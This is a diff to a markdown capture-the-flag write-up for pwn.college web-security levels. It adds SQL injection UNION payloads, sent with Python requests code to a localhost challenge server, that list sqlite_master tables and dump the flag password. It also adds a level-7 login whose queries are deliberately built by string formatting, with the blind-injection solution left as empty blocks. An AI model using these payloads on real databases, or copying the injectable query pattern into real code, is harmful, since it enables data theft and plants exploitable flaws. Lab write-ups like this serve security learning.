@@ -381,11 +381,104 @@ def level6():
     users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
     return "".join(f'{user["username"]}\n' for user in users)
 ```
+* In this challenge we have to extract the information form databases, but we don't know the table and the database name. 
+
+* We can use some query that will help us in this case.
+
+```sql
+--  this query will extract data from databases.
+
+SELECT name FROM sqlite_master WHERE type = "table"
+
+--  or
+
+SELECT tbl_name FROM sqlite_master
+```
+
+> Inside the ipython
+```python
+In [38]: import requests as rq
+    ...: data = {
+    ...:     'query': ' " UNION SELECT tbl_name FROM sqlite_master --'
+    ...:     }
+    ...: url = "http://challenge.localhost:80"
+    ...: response = rq.post(url, params=data)
+    ...: print(response, "\n", response.text)
+
+<Response [200]> 
+ table6108655952227085405
+
+# or 
+
+In [45]: import requests as rq
+    ...: data = {
+    ...:     'query': ' " UNION SELECT name FROM sqlite_master WHERE type="table"; --'
+    ...:     }
+    ...: url = "http://challenge.localhost:80"
+    ...: response = rq.post(url, params=data)
+    ...: print(response, "\n", response.text)
 
 
-```sh
+<Response [200]> 
+ table6108655952227085405
+
+# for the flag.
+
+In [48]: import requests as rq
+    ...: data = {
+    ...:     'query': ' " UNION SELECT password FROM table6108655952227085405 ; --'
+    ...:     }
+    ...: url = "http://challenge.localhost:80"
+    ...: response = rq.post(url, params=data)
+    ...: print(response, "\n", response.text)
+
+
+<Response [200]> 
+ pwn.college{flag_here}
 
 ```
 
+
+## Web-Security level 
+
+* Exploit a structured query language injection vulnerability to blindly leak data
+
+> Source Code :
+```py
+def level7():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? as password'),
+               (flag,))
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        assert username, "Missing `username` form"
+        assert password, "Missing `password` form"
+
+        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
+        assert user, "Invalid `username` or `password`"
+
+        session["user"] = int(user["rowid"])
+        return redirect(request.path)
+
+    if session.get("user"):
+        user_id = int(session.get("user", -1))
+        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
+        if user:
+            username = user["username"]
+            return f"Hello, {username}!\n"
+
+    return form(["username", "password"])
+```
+
+> Query that we use.
+```sql
+
+```
+
+```py
+
+```
 
 
